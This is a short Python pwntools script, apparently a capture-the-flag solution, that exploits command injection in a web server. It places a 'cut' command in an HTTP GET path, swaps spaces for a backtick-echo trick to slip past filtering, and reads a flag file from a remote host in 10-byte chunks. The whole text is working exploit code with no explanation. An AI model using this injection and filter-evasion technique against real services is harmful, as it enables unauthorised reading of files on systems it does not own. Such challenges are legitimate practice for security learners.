#!/usr/bin/env python3

from pwn import *

flag_file = "/home/ctf/flag.txt"
leak_limit = 10

def leak_flag_part(offset):
    payload = f"cut -b {offset+1}-{offset+1+leak_limit} /home/*/fl*"
    payload = payload.replace(" ", "`echo ' '`")

    sock = remote("34.72.232.191", 8080)
    # sock = remote("localhost", 8080)
    req = f"GET /{payload}? HTTP/1.1\r\n\r\n"
    log.info(req)
    sock.send(req)
    sock.recvuntil("\r\n\r\n")
    return sock.recvall().decode()

def main():
    flag = ""
    while "}" not in flag:
        flag += leak_flag_part(len(flag))
        log.info(f"Flag: {flag}")

if __name__ == "__main__":
    main()
